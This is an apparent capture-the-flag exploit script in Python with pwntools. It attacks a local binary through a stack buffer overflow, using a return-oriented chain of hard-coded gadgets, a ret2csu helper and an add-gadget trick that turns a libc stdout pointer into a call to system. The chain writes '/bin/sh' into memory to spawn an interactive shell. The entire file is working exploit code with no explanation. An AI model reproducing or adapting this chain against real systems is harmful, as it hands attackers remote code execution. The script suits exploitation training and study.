from pwn import *
context(os='linux', arch='amd64' , log_level='debug')

procname = './pwn'
libcname = './libc.so.6'

# io = process(['python', './twins.py'], stdin=PTY)
# io = process('./twins', stdin=PTY)
# io = process(procname, stdin=PTY)
io = remote('127.0.0.1', 42853)
elf = ELF(procname)
libc = ELF(libcname)

n2b = lambda x    : str(x).encode()
rv  = lambda x    : io.recv(x)
ru  = lambda s    : io.recvuntil(s, drop=True)
sd  = lambda s    : io.send(s)
sl  = lambda s    : io.sendline(s)
sn  = lambda s    : sl(n2b(n))
sa  = lambda p, s : io.sendafter(p, s)
sla = lambda p, s : io.sendlineafter(p, s)
sna = lambda p, n : sla(p, n2b(n))
ia  = lambda      : io.interactive()
rop = lambda r    : flat([p64(x) for x in r])

ret = 0x00401284
add_dword_rbp_0x3d_ebx_ret = 0x0040115c
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x0040127a
csu = 0x00401257
bss = elf.bss(0)
buf = elf.bss(0x40)

def ret2csu(rdi=0, rsi=0, rdx=0, rbp=0xdeadbeef, addr=bss):
    return rop([
        pop_rbx_rbp_r12_r13_r14_r15_ret,
        0, 1, rdi, rsi, rdx, addr, csu,
        0, 0, rbp, 0, 0, 0, 0,
    ])

def add(off, addr=bss):
    return flat([
        pop_rbx_rbp_r12_r13_r14_r15_ret,
        off, addr + 0x3d, 0, 0, 0, 0,
        add_dword_rbp_0x3d_ebx_ret,
    ])

last = libc.sym._IO_2_1_stdout_
def call(func, rdi=0, rsi=0, rdx=0):
    global last
    res = flat([
        add(func - last),
        ret2csu(rdi, rsi, rdx)
    ])
    last = func
    return res

payload = b'a' * 0x18 + flat([
    ret,
    add(0x6e69622f, buf),
    add(0x0068732f, buf + 4),
    call(libc.sym.system, buf)
])

sla(b'name?\n', payload)

ia()
